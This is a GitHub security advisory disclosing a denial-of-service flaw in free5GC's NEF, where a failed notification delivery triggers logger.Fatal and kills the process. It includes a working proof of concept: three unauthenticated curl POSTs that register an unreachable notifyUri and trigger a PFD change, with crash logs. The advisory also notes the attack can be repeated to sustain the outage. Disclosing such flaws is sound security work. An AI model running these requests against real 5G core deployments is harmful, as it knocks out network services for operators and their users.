# [H] free5GC's NEF crashes via logger.Fatal on PFD notification delivery failure (attacker-controlled notifyUri)

## Summary
Severity: High
Advisory: GHSA-rxrq-fv76-26pr
CVE: CVE-2026-44319
CWE: CWE-20, CWE-617, CWE-755
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-rxrq-fv76-26pr
Type: github-advisory

## Affected
- Go: `github.com/free5gc/nef` — affected >=0 <1.2.3

## Details
### Summary
free5GC's NEF terminates the entire process when a stored PFD-subscription `notifyUri` cannot be reached. In `PfdChangeNotifier.FlushNotifications()`, the notifier calls `NnefPFDmanagementNotify(...)` and on any delivery error invokes `logger.PFDManageLog.Fatal(err)`, which is `os.Exit(1)`-equivalent in Go. An attacker who can create a PFD subscription with an attacker-chosen `notifyUri` and then trigger a PFD change can deterministically kill NEF on the asynchronous delivery attempt -- the process exits with status `1`, dropping NEF's entire SBI surface until restart. This is materially worse than a per-request panic-DoS (Gin recovery does not catch `Fatal`).

The trigger uses three POSTs that are reachable without an `Authorization` header in v4.2.1, because the underlying NEF SBI route groups themselves are mounted without inbound auth middleware (see free5gc/free5gc#858, free5gc/free5gc#859, free5gc/free5gc#862). So in the lab the entire chain is unauthenticated end-to-end. This advisory is scoped to the `Fatal`-on-delivery-failure code defect; the auth-bypass primitives are tracked separately in the upstream issues above.

### Details
Validated against the NEF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/nef:v4.2.1`
- Runtime NEF commit: `5ce35eab`
- Docker validation date: 2026-03-20 (container log timestamp `2026-03-20T16:00:03Z`)
- NEF endpoint: `http://10.100.200.19:8000`

Vulnerable notifier path:
```go
_, err := nc.notifier.clientPfdManagement.PFDSubscriptionsApi.NnefPFDmanagementNotify(
    context.TODO(), nc.notifier.getSubURI(id), notifyReq)
if err != nil {
    logger.PFDManageLog.Fatal(err)   // <-- os.Exit(1)-equivalent
}
```

The failing branch is reached whenever NEF's outbound POST to the subscriber's `notifyUri` returns an error (connection refused, DNS failure, TLS error, timeout, etc.). The delivery happens asynchronously after the PFD-management transaction is accepted, so the triggering HTTP request (the PFD change) returns `201 Created` and only then does NEF die.

Code evidence (paths in `free5gc/nef`):
- Notifier dispatch:
  - `NFs/nef/internal/sbi/notifier/pfd_notifier.go:135`
- Fatal call site (process exit):
  - `NFs/nef/internal/sbi/notifier/pfd_notifier.go:142`

### PoC
Reproduced end-to-end against the running NEF at `http://10.100.200.19:8000` -- three unauthenticated POSTs, the third one indirectly triggers async notify -> Fatal -> process exit.

1. Create an AF context (no Authorization header):
```
curl -i -X POST 'http://10.100.200.19:8000/3gpp-traffic-influence/v1/afdos/subscriptions' \
  -H 'Content-Type: application/json' \
  --data '{"afAppId":"app-nef-dos","anyUeInd":true}'
```
```
HTTP/1.1 201 Created
Location: http://nef.free5gc.org:8000/3gpp-traffic-influence/v1/afdos/subscriptions/1
```

2. Create a PFD subscription with an attacker-chosen unreachable callback (port 1 = always refused locally):
```
curl -i -X POST 'http://10.100.200.19:8000/nnef-pfdmanagement/v1/subscriptions' \
  -H 'Content-Type: application/json' \
  --data '{"applicationIds":["app-nef-dos"],"notifyUri":"http://127.0.0.1:1/notify"}'
```
```
HTTP/1.1 201 Created
Location: http://nef.free5gc.org:8000/nnef-pfdmanagement/v1/subscriptions/1
```

3. Trigger a PFD change so NEF tries to deliver a notification to the bad URI:
```
curl -i -X POST 'http://10.100.200.19:8000/3gpp-pfd-management/v1/afdos/transactions' \
  -H 'Content-Type: application/json' \
  --data '{"pfdDatas":{"app-nef-dos":{"externalAppId":"app-nef-dos","pfds":{"pfd1":{"pfdId":"pfd1","flowDescriptions":["permit in ip from 10.68.28.39 80 to any","permit out ip from any to 10.68.28.39 80"]}}}}}'
```
The PFD POST itself returns `201`, but immediately afterward NEF exits.

4. Confirm the NEF container is dead (`exited`, `exit=1`):
```
docker inspect nef --format 'status={{.State.Status}} restart={{.RestartCount}} exit={{.State.ExitCode}}'
```
```
status=exited restart=0 exit=1
```

5. NEF container logs (`docker logs --since 2026-03-20T16:00:03Z nef`) show the `[FATA]` line that terminated the process:
```
[INFO][NEF][PFDMng] PostPFDManagementTransactions - scsAsID[afdos]
[INFO][NEF][CTX][AFID:AF:afdos][PfdTRID:PFDT:1] New pfd transcation
[INFO][NEF][CTX][AFID:AF:afdos][PfdTRID:PFDT:1] PFD Management Transaction is added
[INFO][NEF][GIN] | 201 | POST | /3gpp-pfd-management/v1/afdos/transactions |
[FATA][NEF][PFDMng] Post "http://127.0.0.1:1/notify": dial tcp 127.0.0.1:1: connect: connection refused
```

### Impact
Reachable assertion / fail-fast (CWE-617) inside an asynchronous notification delivery path, plus improper handling of an exceptional condition (CWE-755) (treating a transient outbound HTTP failure as fatal), plus missing input validation (CWE-20) on the attacker-supplied `notifyUri`. `logger.Fatal` is `os.Exit(1)`-equivalent in Go -- it skips Gin recovery, deferred cleanup, and connection draining; the whole NEF process terminates.

In v4.2.1, the trigger chain is reachable without an `Authorization` header because the NEF route groups used in the chain are themselves mounted without inbound auth middleware (free5gc/free5gc#858, free5gc/free5gc#859, free5gc/free5gc#862). So in the validation lab any party that can reach NEF on the SBI can:
- Submit the three-step trigger anonymously and immediately terminate the NEF process.
- Repeat the trigger after every restart to sustain the outage.
- Pick any unreachable `notifyUri` (refused port, blackholed IP, DNS-NXDOMAIN, broken TLS) -- the failure branch is the same `Fatal`, so partial fixes that block one URI do not close the family.

No Confidentiality impact (the failure returns no attacker-readable data). No persistent Integrity impact (NEF state is in-memory and is lost when the process dies). The whole impact concentrates in Availability: complete loss of NEF service via a single attacker-controlled notification target.

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/924
Upstream fix: https://github.com/free5gc/nef/pull/25

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-rxrq-fv76-26pr
- https://nvd.nist.gov/vuln/detail/CVE-2026-44319
- https://github.com/free5gc/free5gc/issues/924
- https://github.com/free5gc/nef/pull/25
- https://github.com/free5gc/nef/commit/f110517b1189801950b50668a593398687049074
- https://github.com/free5gc/free5gc
